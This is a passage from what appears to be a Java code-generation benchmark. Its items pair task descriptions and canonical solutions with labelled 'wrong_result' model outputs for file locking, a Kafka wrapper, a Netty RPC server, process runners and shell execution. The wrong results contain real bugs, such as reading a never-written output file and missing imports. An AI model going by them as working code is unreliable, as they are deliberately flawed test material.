    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.*;\nimport java.nio.file.attribute.FileAttribute;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class JobPrefixFile implements AutoCloseable {\n    private final String prefix;\n    private final Path file;\n    private FileChannel channel;\n    private FileLock lock;\n    private final AtomicBoolean released = new AtomicBoolean(false);\n\n    private JobPrefixFile(String prefix, Path file) throws IOException {\n        this.prefix = prefix;\n        this.file = file;\n        this.channel = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        this.lock = this.channel.tryLock();\n        if (lock == null) {\n            throw new IOException(\"Could not lock the file: \" + file);\n        }\n    }\n\n    public static JobPrefixFile create(Path directory) throws IOException {\n        return create(\"job-\", directory);\n    }\n\n    public static JobPrefixFile create(String prefix, Path directory) throws IOException {\n        Path tempFile = Files.createTempFile(directory, prefix, \".tmp\");\n        return new JobPrefixFile(prefix, tempFile);\n    }\n\n    public static JobPrefixFile tryFromExistingFile(Path file) throws IOException {\n        try {\n            FileChannel channel = FileChannel.open(file, StandardOpenOption.WRITE);\n            FileLock lock = channel.tryLock();\n            if (lock == null) {\n                channel.close();\n                throw new IOException(\"Could not lock existing file: \" + file);\n            }\n            return new JobPrefixFile(file.getFileName().toString(), file);\n        } catch (IOException e) {\n            deleteIfExists(file);\n            throw e;\n        }\n    }\n\n    public void delete() throws IOException {\n        release();\n        deleteIfExists(file);\n    }\n\n    public String prefix() {\n        return prefix;\n    }\n\n    public void release() throws IOException {\n        if (released.compareAndSet(false, true)) {\n            close(lock);\n            close(channel);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        release();\n    }\n\n    private static void deleteIfExists(Path file) {\n        try {\n            if (Files.exists(file)) {\n                Files.delete(file);\n            }\n        } catch (IOException ignored) {\n        }\n    }\n\n    private static void close(AutoCloseable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (Exception ignored) {\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Create a wrapper class for Kafka Producer to simplify message sending operations and resource management.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for interacting with a Kafka Producer, handling message sending, flushing, and proper resource cleanup. It encapsulates a KafkaProducer instance and delegates operations to it.\n\nAttributes:\n- producer: Producer<K, V> - The underlying Kafka Producer instance that handles actual message production\n\nMethods:\n- Constructor: KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) -> void - Initializes the wrapper with Kafka configuration, key serializer, and value serializer\n- send: send(ProducerRecord<K, V> record) -> Future<RecordMetadata> - Sends a message to Kafka without a callback\n- send: send(ProducerRecord<K, V> record, Callback callback) -> Future<RecordMetadata> - Sends a message to Kafka with a callback\n- flush: flush() -> void - Flushes any buffered messages\n- close: close() -> void - Closes the producer immediately\n- close: close(Duration timeout) -> void - Closes the producer with a specified timeout",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.Serializer;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.Future;\n\npublic class KafkaProducerWrapper<K, V> {\n\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, \n                              Serializer<K> keySerializer, \n                              Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.serialization.Serializer;\nimport java.time.Duration;\nimport java.util.Map;\n\npublic class KafkaProducerWrapper<K, V> {\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout);\n    }\n}\n```"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Create a Java class that implements an RPC server using Netty framework for handling network communication, managing connections, and processing RPC requests.\n\nClass Description: RpcServer is an abstract remoting server implementation that provides RPC functionality using Netty. It handles server initialization, startup, shutdown, and connection management while supporting various network configurations and user-defined processors.\n\nAttributes:\n- logger: Logger - Logger instance for server operations\n- bootstrap: ServerBootstrap - Netty server bootstrap configuration\n- channelFuture: ChannelFuture - Future representing server channel binding\n- userProcessors: ConcurrentHashMap<String, UserProcessor<?>> - Map of registered user processors\n- bossGroup: EventLoopGroup - Event loop group for accepting connections\n- workerGroup: EventLoopGroup - Event loop group for handling connections\n- addressParser: RemotingAddressParser - Parser for remote addresses\n- connectionManager: DefaultServerConnectionManager - Manager for server connections\n- rpcRemoting: RpcRemoting - RPC communication handler\n- codec: Codec - Protocol codec for encoding/decoding messages\n\nMethods:\n- RpcServer(int port, boolean manageConnection) -> void - Constructor that initializes server with port and connection management flag\n- doInit() -> void - Initializes server components including bootstrap configuration and pipeline setup\n- doStart() -> boolean - Starts the server and binds to specified port\n- doStop() -> boolean - Stops the server and releases resources\n- registerUserProcessor(UserProcessor<?> processor) -> void - Registers a user-defined processor for handling requests\n- invokeSync(Connection conn, Object request, int timeoutMillis) -> Object - Synchronously invokes RPC call with specified timeout",
    "Canonical_solution": "import com.alipay.remoting.*;\nimport com.alipay.remoting.config.BoltGenericOption;\nimport com.alipay.remoting.config.BoltServerOption;\nimport com.alipay.remoting.rpc.protocol.UserProcessor;\nimport com.alipay.remoting.util.NettyEventLoopUtil;\nimport com.alipay.remoting.util.RemotingUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.buffer.UnpooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.flush.FlushConsolidationHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ExecutorService;\n\npublic class RpcServer extends AbstractRemotingServer {\n\n    private static final Logger logger = LoggerFactory.getLogger(\"RpcRemoting\");\n    private ServerBootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>(4);\n    private final EventLoopGroup bossGroup = NettyEventLoopUtil.newEventLoopGroup(1, new NamedThreadFactory(\"Rpc-netty-server-boss\", false));\n    private static final EventLoopGroup workerGroup = NettyEventLoopUtil.newEventLoopGroup(Runtime.getRuntime().availableProcessors() * 2, new NamedThreadFactory(\"Rpc-netty-server-worker\", true));\n    private RemotingAddressParser addressParser;\n    private DefaultServerConnectionManager connectionManager;\n    protected RpcRemoting rpcRemoting;\n    private Codec codec = new RpcCodec();\n\n    public RpcServer(int port, boolean manageConnection) {\n        super(port);\n        if (manageConnection) {\n            option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH, true);\n        }\n    }\n\n    @Override\n    protected void doInit() {\n        if (this.addressParser == null) {\n            this.addressParser = new RpcAddressParser();\n        }\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH)) {\n            this.connectionManager = new DefaultServerConnectionManager(new RandomSelectStrategy(this));\n            this.connectionManager.startup();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n        this.bootstrap.group(bossGroup, workerGroup)\n            .channel(NettyEventLoopUtil.getServerSocketChannelClass())\n            .option(ChannelOption.SO_BACKLOG, ConfigManager.tcp_so_backlog())\n            .option(ChannelOption.SO_REUSEADDR, ConfigManager.tcp_so_reuseaddr())\n            .childOption(ChannelOption.TCP_NODELAY, ConfigManager.tcp_nodelay())\n            .childOption(ChannelOption.SO_KEEPALIVE, ConfigManager.tcp_so_keepalive());\n\n        if (ConfigManager.netty_buffer_pooled()) {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n        } else {\n            this.bootstrap.option(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT)\n                .childOption(ChannelOption.ALLOCATOR, UnpooledByteBufAllocator.DEFAULT);\n        }\n\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel channel) {\n                ChannelPipeline pipeline = channel.pipeline();\n                pipeline.addLast(\"decoder\", codec.newDecoder());\n                pipeline.addLast(\"encoder\", codec.newEncoder());\n                if (ConfigManager.tcp_idle_switch()) {\n                    pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, ConfigManager.tcp_server_idle(), TimeUnit.MILLISECONDS));\n                }\n                if (option(BoltServerOption.NETTY_FLUSH_CONSOLIDATION)) {\n                    pipeline.addLast(\"flushConsolidationHandler\", new FlushConsolidationHandler(1024, true));\n                }\n                pipeline.addLast(\"handler\", new RpcHandler(true, userProcessors));\n            }\n        });\n    }\n\n    @Override\n    protected boolean doStart() throws InterruptedException {\n        this.channelFuture = this.bootstrap.bind(new InetSocketAddress(ip(), port())).sync();\n        if (port() == 0 && channelFuture.isSuccess()) {\n            setLocalBindingPort(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n        }\n        return this.channelFuture.isSuccess();\n    }\n\n    @Override\n    protected boolean doStop() {\n        if (null != this.channelFuture) {\n            this.channelFuture.channel().close();\n        }\n        this.bossGroup.shutdownGracefully();\n        if (option(BoltServerOption.SERVER_MANAGE_CONNECTION_SWITCH) && null != this.connectionManager) {\n            this.connectionManager.shutdown();\n        }\n        return true;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        UserProcessorRegisterHelper.registerUserProcessor(processor, this.userProcessors);\n    }\n\n    public Object invokeSync(final Connection conn, final Object request, final int timeoutMillis) throws RemotingException, InterruptedException {\n        return this.rpcRemoting.invokeSync(conn, request, null, timeoutMillis);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic abstract class RpcServer {\n    protected final Logger logger = LoggerFactory.getLogger(RpcServer.class);\n    protected ServerBootstrap bootstrap;\n    protected ChannelFuture channelFuture;\n    protected final ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>();\n    protected EventLoopGroup bossGroup;\n    protected EventLoopGroup workerGroup;\n    protected RemotingAddressParser addressParser;\n    protected DefaultServerConnectionManager connectionManager;\n    protected RpcRemoting rpcRemoting;\n    protected Codec codec;\n\n    public RpcServer(int port, boolean manageConnection) {\n        doInit();\n    }\n\n    protected void doInit() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(codec.getDecoder());\n                        pipeline.addLast(codec.getEncoder());\n                        pipeline.addLast(rpcRemoting.getChannelHandler());\n                    }\n                });\n    }\n\n    public boolean doStart(int port) {\n        try {\n            channelFuture = bootstrap.bind(port).sync();\n            if (channelFuture.isSuccess()) {\n                logger.info(\"RpcServer started on port {}\", port);\n                return true;\n            }\n        } catch (Exception e) {\n            logger.error(\"Failed to start RpcServer\", e);\n        }\n        return false;\n    }\n\n    public boolean doStop() {\n        try {\n            if (channelFuture != null) {\n                channelFuture.channel().closeFuture().sync();\n            }\n            if (bossGroup != null) {\n                bossGroup.shutdownGracefully();\n            }\n            if (workerGroup != null) {\n                workerGroup.shutdownGracefully();\n            }\n            logger.info(\"RpcServer stopped\");\n            return true;\n        } catch (Exception e) {\n            logger.error(\"Failed to stop RpcServer\", e);\n        }\n        return false;\n    }\n\n    public void registerUserProcessor(UserProcessor<?> processor) {\n        String type = processor.getCommandType();\n        userProcessors.put(type, processor);\n    }\n\n    public Object invokeSync(Connection conn, Object request, int timeoutMillis) throws InterruptedException {\n        return rpcRemoting.invokeSync(conn, request, timeoutMillis);\n    }\n}\n```"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a function that deobfuscates a Java stack trace by processing it through an external retrace tool, handling both success and failure cases appropriately.\n\nFunction Description: The function takes a Throwable object, converts its stack trace to a string, and attempts to deobfuscate it using an external retrace script (either .bat for Windows or .sh for other systems). The function handles temporary file creation for input, process execution, and output processing, with proper error handling and fallback to the original stack trace if deobfuscation fails.\n\nInput: \n- t: Throwable - The exception/throwable whose stack trace needs to be deobfuscated\n\nOutput: \n- String - The deobfuscated stack trace if successful, or the original stack trace if deobfuscation fails or isn't possible\n\nNote: The function relies on an environment variable XPIPE_MAPPING for the mapping file path and uses system-specific retrace scripts (retrace.bat or retrace.sh). It also includes a canDeobfuscate() check (implementation not shown) to determine if deobfuscation should be attempted.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.List;\n\npublic static String deobfuscateToString(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    String stackTrace = sw.toString();\n    stackTrace = stackTrace.replaceAll(\"at .+/(.+)\", \"at $1\");\n\n    try {\n        if (!canDeobfuscate()) {\n            return stackTrace;\n        }\n\n        var file = Files.createTempFile(\"xpipe_stracktrace\", null);\n        Files.writeString(file, stackTrace);\n        var proc = new ProcessBuilder(\n                        \"retrace.\" + (OsType.getLocal().equals(OsType.WINDOWS) ? \"bat\" : \"sh\"),\n                        System.getenv(\"XPIPE_MAPPING\"),\n                        file.toString())\n                .redirectErrorStream(true);\n        var active = proc.start();\n        var out = new String(active.getInputStream().readAllBytes())\n                .replaceAll(\"\\r\\n\", NewLine.LF.getNewLineString());\n        var code = active.waitFor();\n        if (code == 0) {\n            return out;\n        } else {\n            System.err.println(\"Deobfuscation failed: \" + out);\n        }\n    } catch (Exception ex) {\n        System.err.println(\"Deobfuscation failed\");\n        return stackTrace;\n    }\n\n    return stackTrace;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic String deobfuscateStackTrace(Throwable t) {\n    if (!canDeobfuscate()) {\n        return getOriginalStackTrace(t);\n    }\n\n    String originalStackTrace = getOriginalStackTrace(t);\n    Path tempInputFile;\n    Path tempOutputFile;\n\n    try {\n        tempInputFile = Files.createTempFile(\"stacktrace_\", \".txt\");\n        tempOutputFile = Files.createTempFile(\"deobfuscated_\", \".txt\");\n\n        Files.write(tempInputFile, originalStackTrace.getBytes(StandardCharsets.UTF_8));\n\n        String mappingPath = System.getenv(\"XPIPE_MAPPING\");\n        if (mappingPath == null || mappingPath.isEmpty()) {\n            return originalStackTrace;\n        }\n\n        String scriptName = System.getProperty(\"os.name\").toLowerCase().startsWith(\"win\") ? \"retrace.bat\" : \"retrace.sh\";\n        ProcessBuilder processBuilder = new ProcessBuilder(scriptName, tempInputFile.toString(), mappingPath)\n                .directory(new File(\".\").getAbsoluteFile())\n                .redirectErrorStream(true);\n\n        Process process = processBuilder.start();\n        int exitCode = process.waitFor();\n\n        if (exitCode != 0) {\n            return originalStackTrace;\n        }\n\n        String deobfuscated = new String(Files.readAllBytes(tempOutputFile), StandardCharsets.UTF_8);\n        return deobfuscated.trim().isEmpty() ? originalStackTrace : deobfuscated;\n\n    } catch (Exception e) {\n        return originalStackTrace;\n    } finally {\n        try {\n            if (tempInputFile != null) {\n                Files.deleteIfExists(tempInputFile);\n            }\n            if (tempOutputFile != null) {\n                Files.deleteIfExists(tempOutputFile);\n            }\n        } catch (IOException ignored) {\n        }\n    }\n}\n\nprivate String getOriginalStackTrace(Throwable t) {\n    StringWriter sw = new StringWriter();\n    PrintWriter pw = new PrintWriter(sw);\n    t.printStackTrace(pw);\n    return sw.toString();\n}\n```"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes with proper stream handling and synchronization.\n\nClass Description: The ProcessRunner class is designed to execute external system processes while managing their input, output, and error streams asynchronously. It provides a clean interface for process execution with automatic stream redirection and proper thread synchronization.\n\nAttributes:\n- processRoot: File - The working directory where the external process will be executed\n\nMethods:\n- Constructor: ProcessRunner(File processRoot) -> void - Initializes the ProcessRunner with the specified working directory\n- execute: execute(ProcessBuilder pb) -> void - Executes the process configured by the ProcessBuilder, redirects error stream to output, and manages stream piping asynchronously\n- AsyncPipe (inner class): \n  - Constructor: AsyncPipe(InputStream is, OutputStream os) -> void - Creates a pipe between input and output streams with automatic closing\n  - Constructor: AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) -> void - Creates a pipe with configurable stream closing behavior\n  - run: run() -> void - The thread's main execution method that continuously reads from input stream and writes to output stream",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.concurrent.CountDownLatch;\n\npublic class ProcessRunner {\n    private final File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n        pb.directory(processRoot);\n        pb.redirectErrorStream(true);\n\n        Process process = pb.start();\n        CountDownLatch latch = new CountDownLatch(1);\n\n        Thread inputThread = new Thread(new AsyncPipe(System.in, process.getOutputStream()));\n        Thread outputThread = new Thread(new AsyncPipe(process.getInputStream(), System.out));\n        inputThread.start();\n        outputThread.start();\n\n        process.onExit().thenRun(() -> {\n            try {\n                process.getOutputStream().close();\n                process.getInputStream().close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                latch.countDown();\n            }\n        });\n\n        latch.await();\n    }\n\n    public static class AsyncPipe implements Runnable {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, true);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[1024];\n            int length;\n            try {\n                while ((length = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, length);\n                    os.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        is.close();\n                        os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Create a Java class that implements shell command execution functionality, allowing for command input, output reading, and process management.\n\nClass Description: ProcessShell is a class that provides an interface for executing shell commands, managing the process lifecycle, and handling input/output streams. It extends AbstractShell and supports both regular and root command execution.\n\nAttributes:\n- mProcess: Process - The running process instance\n- mCommandOutputStream: DataOutputStream - Stream for writing commands to the process\n- mSucceedReader: BufferedReader - Reader for standard output stream\n- mErrorReader: BufferedReader - Reader for error output stream\n- mSucceedOutput: StringBuilder - Buffer for storing standard output\n- mErrorOutput: StringBuilder - Buffer for storing error output\n\nMethods:\n- init(String initialCommand) -> void - Initializes the shell process with the given command\n- exec(String command) -> void - Executes the given command in the shell\n- exit() -> void - Terminates the process and cleans up resources\n- exitAndWaitFor() -> void - Sends exit command, waits for process completion, then exits\n- waitFor() -> int - Waits for the process to complete and returns exit code\n- readAll() -> ProcessShell - Reads all available output (both standard and error)\n- readSucceedOutput() -> ProcessShell - Reads standard output\n- readErrorOutput() -> ProcessShell - Reads error output\n- getSucceedOutput() -> StringBuilder - Returns the standard output buffer\n- getErrorOutput() -> StringBuilder - Returns the error output buffer\n- getProcess() -> Process - Returns the process instance\n- getSucceedReader() -> BufferedReader - Returns the standard output reader\n- getErrorReader() -> BufferedReader - Returns the error output reader",
    "Canonical_solution": "import android.util.Log;\nimport com.stardust.autojs.runtime.api.AbstractShell;\nimport com.stardust.autojs.runtime.exception.ScriptInterruptedException;\nimport com.stardust.autojs.util.ProcessUtils;\nimport com.stardust.pio.UncheckedIOException;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessShell extends AbstractShell {\n\n    private static final String TAG = \"ProcessShell\";\n    private Process mProcess;\n    private DataOutputStream mCommandOutputStream;\n    private BufferedReader mSucceedReader;\n    private BufferedReader mErrorReader;\n    private StringBuilder mSucceedOutput = new StringBuilder();\n    private StringBuilder mErrorOutput = new StringBuilder();\n\n    public ProcessShell() {\n    }\n\n    public ProcessShell(boolean root) {\n        super(root);\n    }\n\n    @Override\n    protected void init(String initialCommand) {\n        try {\n            mProcess = new ProcessBuilder(initialCommand).redirectErrorStream(true).start();\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    @Override\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command);\n            if (!command.endsWith(COMMAND_LINE_END)) {\n                mCommandOutputStream.writeBytes(COMMAND_LINE_END);\n            }\n            mCommandOutputStream.flush();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void exit() {\n        if (mProcess != null) {\n            Log.d(TAG, \"exit: pid = \" + ProcessUtils.getProcessPid(mProcess));\n            mProcess.destroy();\n            mProcess = null;\n        }\n        if (mSucceedReader != null) {\n            try {\n                mSucceedReader.close();\n            } catch (IOException ignored) {\n            }\n            mSucceedReader = null;\n        }\n        if (mErrorReader != null) {\n            try {\n                mErrorReader.close();\n            } catch (IOException ignored) {\n            }\n            mErrorReader = null;\n        }\n    }\n\n    @Override\n    public void exitAndWaitFor() {\n        exec(COMMAND_EXIT);\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public ProcessShell readAll() {\n        return readSucceedOutput().readErrorOutput();\n    }\n\n    public ProcessShell readSucceedOutput() {\n        read(mSucceedReader, mSucceedOutput);\n        return this;\n    }\n\n    private void read(BufferedReader reader, StringBuilder sb) {\n        try {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n\n    public ProcessShell readErrorOutput() {\n        read(mErrorReader, mErrorOutput);\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\n\npublic class ProcessShell extends AbstractShell {\n    protected Process mProcess;\n    protected DataOutputStream mCommandOutputStream;\n    protected BufferedReader mSucceedReader;\n    protected BufferedReader mErrorReader;\n    protected StringBuilder mSucceedOutput;\n    protected StringBuilder mErrorOutput;\n\n    public ProcessShell(String initialCommand) {\n        init(initialCommand);\n    }\n\n    public void init(String initialCommand) {\n        try {\n            mProcess = Runtime.getRuntime().exec(initialCommand);\n            mCommandOutputStream = new DataOutputStream(mProcess.getOutputStream());\n            mSucceedReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n            mErrorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n            mSucceedOutput = new StringBuilder();\n            mErrorOutput = new StringBuilder();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exec(String command) {\n        try {\n            mCommandOutputStream.writeBytes(command + \"\\n\");\n            mCommandOutputStream.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exit() {\n        try {\n            mCommandOutputStream.close();\n            mSucceedReader.close();\n            mErrorReader.close();\n            mProcess.destroy();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void exitAndWaitFor() {\n        exec(\"exit\");\n        waitFor();\n        exit();\n    }\n\n    public int waitFor() {\n        try {\n            return mProcess.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public ProcessShell readAll() {\n        readSucceedOutput();\n        readErrorOutput();\n        return this;\n    }\n\n    public ProcessShell readSucceedOutput() {\n        try {\n            String line;\n            while ((line = mSucceedReader.readLine()) != null) {\n                mSucceedOutput.append(line).append(\"\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public ProcessShell readErrorOutput() {\n        try {\n            String line;\n            while ((line = mErrorReader.readLine()) != null) {\n                mErrorOutput.append(line).append(\"\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return this;\n    }\n\n    public StringBuilder getSucceedOutput() {\n        return mSucceedOutput;\n    }\n\n    public StringBuilder getErrorOutput() {\n        return mErrorOutput;\n    }\n\n    public Process getProcess() {\n        return mProcess;\n    }\n\n    public BufferedReader getSucceedReader() {\n        return mSucceedReader;\n    }\n\n    public BufferedReader getErrorReader() {\n        return mErrorReader;\n    }\n}\n```"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Create a Java class that manages external processes, handling their input/output streams and providing control over process execution, including starting, stopping, and monitoring.\n\nClass Description: The DaemonHandler class is designed to manage external processes executed via ProcessBuilder. It provides functionality to start processes with either delimited or undelimited output handling, stop processes (either gracefully or forcibly), and retrieve process exit codes. The class maintains separate threads for handling standard output and error streams, with output being captured and placed into a shared blocking deque.\n\nAttributes:\n- processBuilder: ProcessBuilder - Configures and starts external processes\n- process: Process - Represents the currently running external process\n- outThread: Thread - Thread handling standard output stream\n- errThread: Thread - Thread handling error output stream\n- errProxy: OutputProxy - Proxy for handling error stream output\n- outProxy: OutputProxy - Proxy for handling standard output stream\n- deque: BlockingDeque<Event> - Shared queue for process output events\n- stdOut: boolean - Flag indicating whether to capture standard output\n\nMethods:\n- DaemonHandler(BlockingDeque<Event>, String...) -> void - Constructor that initializes the process handler with output queue and command\n- setStdOutListener(boolean) -> void - Sets whether to capture standard output\n- startDelimited() -> Process - Starts process with delimited output handling (using default delimiter)\n- startDelimited(byte) -> Process - Starts process with custom delimiter for output handling\n- startUndelimited() -> Process - Starts process with undelimited output handling (default buffer size)\n- startUndelimited(int) -> Process - Starts process with undelimited output handling (custom buffer size)\n- stop(boolean) -> void - Stops the managed process (optionally forcibly)\n- getExitCode() -> int - Retrieves the exit code of the process (or PROCESS_STOPPED if not running)",
